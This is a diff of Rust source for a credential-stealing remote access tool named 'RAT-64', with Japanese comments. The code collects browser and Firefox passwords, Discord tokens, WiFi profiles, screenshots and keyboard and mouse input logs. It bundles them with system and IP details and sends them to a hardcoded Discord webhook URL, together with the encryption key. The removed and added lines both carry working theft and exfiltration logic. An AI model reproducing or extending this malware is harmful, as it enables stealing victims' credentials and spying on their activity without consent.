-                        }
-                    }
-                    
-                    start = token_start + token_end;
-                }
-            }
-        }
-    }
-    
-    Ok(tokens)
-}
-
-#[cfg(not(windows))]
-fn extract_discord_tokens_advanced() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    Err("Discord token extraction is only supported on Windows".into())
-}
-
-// WiFi認証情報収集（分離）
-fn collect_wifi_credentials() -> Vec<String> {
-    let mut wifi_creds = Vec::with_capacity(16);
-    
-    if cfg!(windows) {
-        if let Ok(output) = Command::new("netsh")
-            .args(["wlan", "show", "profiles"])
-            .creation_flags(0x08000000)
-            .output() {
-            let profiles_text = String::from_utf8_lossy(&output.stdout);
-            
-            wifi_creds.extend(
-                profiles_text
-                    .lines()
-                    .filter(|line| line.contains("All User Profile"))
-                    .filter_map(|line| line.split(':').nth(1))
-                    .map(|name| name.trim().to_owned())
-                    .filter(|name| !name.is_empty())
-            );
-        }
-    }
-    
-    wifi_creds
-}
-
-// 管理者権限チェック
-#[cfg(windows)]
-pub fn is_admin() -> bool {
-    use windows::{
-        Win32::Foundation::*,
-        Win32::Security::*,
-        Win32::System::Threading::*,
-    };
-    
-    unsafe {
-        let mut token = HANDLE::default();
-        let process = GetCurrentProcess();
-        
-        if OpenProcessToken(
-            process,
-            TOKEN_QUERY,
-            &mut token
-        ).is_err() {
-            return false;
-        }
-        
-        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
-        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
-        
-        let result = GetTokenInformation(
-            token,
-            TokenElevation,
-            Some(&mut elevation as *mut _ as *mut std::ffi::c_void),
-            size,
-            &mut size
-        );
-        
-        let _ = CloseHandle(token);
-        
-        result.is_ok() && elevation.TokenIsElevated != 0
-    }
-}
-
-#[cfg(not(windows))]
-pub fn is_admin() -> bool {
-    false
-}
-
-// 暗号化機能（統合最適化版）
-pub fn encrypt_data(data: &[u8]) -> RatResult<Vec<u8>> {
-    use rand::RngCore;
-    
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 12];
-    rand::rng().fill_bytes(&mut key);
-    rand::rng().fill_bytes(&mut nonce);
-
-    let encrypted = encrypt_data_with_key(data, &key, &nonce)?;
-    
-    // キー、ノンス、データを統合
-    let mut result = Vec::with_capacity(44 + encrypted.len());
-    result.extend_from_slice(&key);
-    result.extend_from_slice(&nonce);
-    result.extend_from_slice(&encrypted);
-    Ok(result)
-}
-
-// 標準ライブラリによるディレクトリ取得（dirsクレート置換）
-fn get_config_dir() -> RatResult<std::path::PathBuf> {
-    #[cfg(windows)]
-    {
-        if let Ok(appdata) = std::env::var("APPDATA") {
-            Ok(std::path::PathBuf::from(appdata))
-        } else {
-            Err(RatError::Config("APPDATA environment variable not found".to_string()))
-        }
-    }
-    #[cfg(not(windows))]
-    {
-        if let Ok(home) = std::env::var("HOME") {
-            Ok(std::path::PathBuf::from(home).join(".config"))
-        } else {
-            Err(RatError::Config("HOME environment variable not found".to_string()))
-        }
-    }
-}
-
-#[allow(dead_code)]
-fn get_home_dir() -> RatResult<std::path::PathBuf> {
-    #[cfg(windows)]
-    {
-        if let Ok(userprofile) = std::env::var("USERPROFILE") {
-            Ok(std::path::PathBuf::from(userprofile))
-        } else {
-            Err(RatError::Config("USERPROFILE environment variable not found".to_string()))
-        }
-    }
-    #[cfg(not(windows))]
-    {
-        if let Ok(home) = std::env::var("HOME") {
-            Ok(std::path::PathBuf::from(home))
-        } else {
-            Err(RatError::Config("HOME environment variable not found".to_string()))
-        }
-    }
-}
-
-// キー管理機能は削除されました - 直接入力のみサポート
-
-// 低レベル暗号化
-pub fn encrypt_data_with_key(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<Vec<u8>> {
-    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
-    cipher.encrypt(Nonce::from_slice(nonce), data)
-        .map_err(|e| RatError::Encryption(format!("Encryption failed: {:?}", e)))
-}
-
-// 復号化機能
-pub fn decrypt_data(encrypted_data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<Vec<u8>> {
-    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
-    cipher.decrypt(Nonce::from_slice(nonce), encrypted_data)
-        .map_err(|e| RatError::Encryption(format!("Decryption failed: {:?}", e)))
-}
-
-// ハードコードされた設定を取得（config.json不使用）
-pub fn load_config_or_default() -> Config {
-    // ハードコード設定を使用
-    get_hardcoded_config()
-}
-
-// ハードコードされた設定（旧config.jsonの内容を直接埋め込み）
-fn get_hardcoded_config() -> Config {
-    Config {
-        collect_auth_data: true,
-        timeout_seconds: 45,
-        webhook_url: "https://discordapp.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
-        webhook_type: "Discord".to_string(),
-        webhook_enabled: true,
-        collect_screenshots: true,
-        collect_webcam: false,
-        collect_processes: true,
-        collect_software: true,
-        collect_browser_passwords: true,
-        collect_browser_cookies: false,
-        collect_wifi_passwords: true,
-        collect_api_keys: false,
-        collect_ssh_keys: false,
-        collect_firefox_passwords: true,
-        collect_discord_tokens: true,
-        enabled_modules: vec![
-            "network".to_string(),
-            "browser".to_string(),
-            "screenshot".to_string(),
-            "webhook".to_string(),
-        ],
-        execution_order: vec![
-            "network".to_string(),
-            "browser".to_string(),
-            "screenshot".to_string(),
-            "webhook".to_string(),
-        ],
-        output_format: "Encrypted".to_string(),
-        max_execution_time: 240,
-        max_processes: 15,
-        retry_attempts: 2,
-    }
-}
-
-// Network機能付きメイン実行関数
-#[cfg(feature = "network")]
-pub fn run_with_webhook(config: &Config) -> RatResult<()> {
-    use crate::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
-    
-    // RAT-64 実行開始（Webhook機能有効）
+// メイン実行機能
+pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
+    let mut results = Vec::new();
     
     // システム情報収集
-    let system_info = get_system_info()?;
-    // システム情報収集完了
-    
-    // 認証データ収集（設定に基づく）
-    let auth_data = if config.collect_auth_data {
-        collect_auth_data_with_config(&config)
-    } else {
-        AuthData {
-            passwords: vec![],
-            wifi_creds: vec![],
+    match get_system_info_async().await {
+        Ok(system_info) => {
+            results.push(format!("✅ システム情報収集成功: {}", system_info.hostname));
         }
-    };
-    // 認証データ収集完了
+        Err(e) => {
+            results.push(format!("❌ システム情報収集失敗: {}", e));
+        }
+    }
     
-    // WebhookConfig作成
-    let webhook_config = WebhookConfig {
-        webhook_url: if config.webhook_url.is_empty() {
+    // 認証データ収集
+    let auth_data = collect_auth_data_with_config(config);
+    results.push(format!("✅ 認証データ収集: {}件のパスワード", auth_data.passwords.len()));
+    
+    // スクリーンショット収集
+    if config.collect_screenshots {
+        let screenshot_data = collect_screenshots(config);
+        results.push(format!("✅ スクリーンショット収集: {}件", screenshot_data.total_count));
+    }
+    
+    Ok(results.join("\n"))
+}
+
+// 統合データペイロード作成
+#[derive(Serialize, Deserialize, Debug)]
+pub struct IntegratedPayload {
+    pub system_info: SystemInfo,
+    pub auth_data: AuthData,
+    pub screenshot_data: Option<ScreenshotData>,
+    pub input_events: Option<Vec<String>>,    // 入力イベントログ
+    pub timestamp: String,
+    pub session_id: String,
+    pub encryption_key: Option<String>,  // Base64エンコードされた暗号化キー
+    pub encryption_nonce: Option<String>, // Base64エンコードされたノンス
+}
+
+impl IntegratedPayload {
+    pub async fn create_with_config(config: &Config) -> RatResult<Self> {
+        let system_info = get_system_info_async().await?;
+        let auth_data = collect_auth_data_with_config(config);
+        let screenshot_data = if config.collect_screenshots {
+            Some(collect_screenshots(config))
+        } else {
             None
-        } else {
-            Some(config.webhook_url.clone())
-        },
-        webhook_type: match config.webhook_type.as_str() {
-            "Discord" => WebhookType::Discord,
-            "Slack" => WebhookType::Slack,
-            "Custom" => WebhookType::Custom,
-            _ => WebhookType::None,
-        },
-        retry_attempts: config.retry_attempts,
-        timeout_seconds: config.timeout_seconds,
-    };
-    
-    // Webhook送信
-    if webhook_config.webhook_url.is_some() {
-        let _ = send_webhook(&webhook_config, &system_info, &auth_data);
-    }
-    
-    // スクリーンショット機能（オプション）
-    let screenshot_data = {
-        #[cfg(feature = "screenshot")]
-        if config.collect_screenshots {
-            match crate::modules::screen_capture::capture_all_displays(&ScreenshotConfig::default()) {
-                Ok(screenshot_data) => {
-                    let total_count = screenshot_data.len();
-                    ScreenshotData {
-                        primary_display: screenshot_data.get(0).cloned(),
-                        all_displays: screenshot_data,
-                        capture_time: format!("{:?}", std::time::SystemTime::now()),
-                        total_count,
-                    }
-                },
-                Err(_) => {
-                    ScreenshotData {
-                        primary_display: None,
-                        all_displays: Vec::new(),
-                        capture_time: format!("{:?}", std::time::SystemTime::now()),
-                        total_count: 0,
-                    }
-                }
-            }
-        } else {
-            ScreenshotData {
-                primary_display: None,
-                all_displays: Vec::new(),
-                capture_time: format!("{:?}", std::time::SystemTime::now()),
-                total_count: 0,
-            }
-        }
-        
-        #[cfg(not(feature = "screenshot"))]
-        {
-            ScreenshotData {
-                primary_display: None,
-                all_displays: Vec::new(),
-                capture_time: format!("{:?}", std::time::SystemTime::now()),
-                total_count: 0,
-            }
-        }
-    };
-    
-    // データ暗号化と保存
-    if config.output_format == "Encrypted" {
-        // データ構造体作成
-        #[derive(serde::Serialize)]
-        struct FullData {
-            system_info: SystemInfo,
-            auth_data: AuthData,
-            screenshot_data: ScreenshotData,
-        }
-        
-        let full_data = FullData {
-            system_info: system_info.clone(),
-            auth_data: auth_data.clone(),
-            screenshot_data,
         };
-        
-        // MessagePackでシリアライズ
-        match rmp_serde::to_vec(&full_data) {
-            Ok(serialized_data) => {
-                // キーとナンス生成
-                use rand::RngCore;
-                let mut key = [0u8; 32];
-                let mut nonce = [0u8; 12];
-                rand::rng().fill_bytes(&mut key);
-                rand::rng().fill_bytes(&mut nonce);
-                
-                // 暗号化処理（キー分離形式）
-                match encrypt_data_with_key(&serialized_data, &key, &nonce) {
-                    Ok(encrypted_data) => {
-                        // データ保存
-                        match std::fs::write("data.dat", &encrypted_data) {
-                            Ok(_) => {
-                                // Networkで暗号化キーを送信（full機能時）
-                                #[cfg(feature = "network")]
-                                if webhook_config.webhook_url.is_some() {
-                                    let _ = crate::modules::notification_sender::send_encryption_key_webhook(&webhook_config, &key, &nonce);
-                                }
-                            },
-                            Err(_) => {},
-                        }
-                    },
-                    Err(_) => {},
-                }
-            },
-            Err(_) => {},
-        }
+        // 入力イベント（Windowsのみ、3秒サンプリング）
+        #[cfg(windows)]
+        let input_events = {
+            use crate::collectors::key_mouse_logger::collect_input_events_for;
+            tokio::task::spawn_blocking(|| collect_input_events_for(3000)).await.ok()
+        };
+        #[cfg(not(windows))]
+        let input_events = None;
+
+        Ok(IntegratedPayload {
+            system_info,
+            auth_data,
+            screenshot_data,
+            input_events,
+            timestamp: chrono::Utc::now().to_rfc3339(),
+            session_id: uuid::Uuid::new_v4().to_string(),
+            encryption_key: None,    // 後で設定
+            encryption_nonce: None,  // 後で設定
+        })
     }
     
+    // キーとノンスを設定するメソッド
+    pub fn set_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
+        self.encryption_key = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, key));
+        self.encryption_nonce = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, nonce));
+    }
+}
+
+
+// Webhook送信（統合版）
+pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+    if !config.webhook_enabled {
+        return Ok(());
+    }
+    if config.webhook_url.trim().is_empty() {
+        return Ok(());
+    }
+
+    match config.webhook_type.as_str() {
+        "Discord" => send_discord_webhook(payload, config).await,
+        _ => send_generic_webhook(payload, config).await,
+    }
+}
+
+async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+    use serde_json::json;
+
+    let public_ip = payload.system_info.public_ip.as_deref().unwrap_or("不明");
+    let password_count = payload.auth_data.passwords.len();
+    let wifi_count = payload.auth_data.wifi_creds.len();
+    let screenshot_count = payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0);
+
+    let embed = json!({
+        "title": format!("🔥 RAT-64 データ収集 - {}", payload.system_info.hostname),
+        "color": 0x00ff00,
+        "fields": [
+            {
+                "name": "💻 システム情報",
+                "value": format!("**ホスト名**: {}\n**ユーザー**: {}\n**OS**: {} {}\n**CPU**: {}\n**RAM**: {:.1}GB / {:.1}GB\n**仮想マシン**: {}",
+                    payload.system_info.hostname,
+                    payload.system_info.username,
+                    payload.system_info.os_name,
+                    payload.system_info.os_version,
+                    payload.system_info.cpu_info,
+                    payload.system_info.memory_available_gb,
+                    payload.system_info.memory_total_gb,
+                    if payload.system_info.is_virtual_machine {
+                        payload.system_info
+                            .virtual_machine_vendor
+                            .as_deref()
+                            .unwrap_or("はい")
+                    } else {
+                        "いいえ"
+                    }
+                ),
+                "inline": false
+            },
+            {
+                "name": "🌐 ネットワーク情報", 
+                "value": format!("**ローカルIP**: {}\n**グローバルIP**: {}\n**タイムゾーン**: {}",
+                    payload.system_info.local_ip,
+                    public_ip,
+                    payload.system_info.timezone
+                ),
+                "inline": false
+            },
+            {
+                "name": "📊 収集データ",
+                "value": format!("**パスワード**: {}件\n**WiFi認証情報**: {}件\n**スクリーンショット**: {}件",
+                    password_count,
+                    wifi_count,
+                    screenshot_count
+                ),
+                "inline": false
+            },
+            {
+                "name": "🔐 暗号化情報",
+                "value": format!("**キー**: {}\n**ノンス**: {}",
+                    payload.encryption_key.as_deref().unwrap_or("未設定"),
+                    payload.encryption_nonce.as_deref().unwrap_or("未設定")
+                ),
+                "inline": false
+            }
+        ],
+        "footer": {
+            "text": format!("収集時刻: {} | セッションID: {}", 
+                payload.timestamp, 
+                payload.session_id.chars().take(8).collect::<String>()
+            )
+        }
+    });
+
+    let webhook_payload = json!({
+        "embeds": [embed]
+    });
+
+    let body = serde_json::to_string(&webhook_payload)?;
+    send_json_webhook(&config.webhook_url, body, "Discord Webhook", config.timeout_seconds).await
+}
+
+async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+    let body = serde_json::to_string(payload)?;
+    send_json_webhook(&config.webhook_url, body, "Generic Webhook", config.timeout_seconds).await
+}
+
+async fn send_json_webhook(url: &str, body: String, context: &str, timeout_seconds: u64) -> RatResult<()> {
+    let url_owned = url.to_owned();
+    let context_owned = context.to_owned();
+    let join_context = context_owned.clone();
+
+    let response_result = tokio::task::spawn_blocking(move || {
+        let mut req = minreq::post(url_owned)
+            .with_header("Content-Type", "application/json")
+            .with_body(body);
+        if timeout_seconds > 0 {
+            req = req.with_timeout(timeout_seconds);
+        }
+        req.send()
+    })
+    .await
+    .map_err(|e| RatError::Command(format!("{} Webhook送信スレッドエラー: {}", join_context, e)))?;
+
+    let request_context = context_owned.clone();
+    let response = response_result
+        .map_err(|e| RatError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;
+
+    if !(200..=299).contains(&response.status_code) {
+        return Err(RatError::Command(format!("{} Webhook送信失敗: {}", context_owned, response.status_code)));
+    }
+
     Ok(())
 }
 
-// Network機能なしのフォールバック
-#[cfg(not(feature = "network"))]
-pub fn run_with_webhook(_config: &Config) -> RatResult<()> {
-    Err(RatError::Io(std::io::Error::new(std::io::ErrorKind::Other, "Network機能が無効です")))
+// ユーティリティ関数
+pub fn get_local_ip() -> Option<String> {
+    crate::collectors::system_info::get_primary_local_ip()
 }
-
-// Fallback implementation when the "browser" feature is disabled
-#[cfg(not(feature = "browser"))]
-fn collect_browser_passwords() -> Vec<String> {
-    vec!["Browser collection feature is disabled in this build".to_string()]
-}
+// 全ての必要な依存関係は既に追加済み
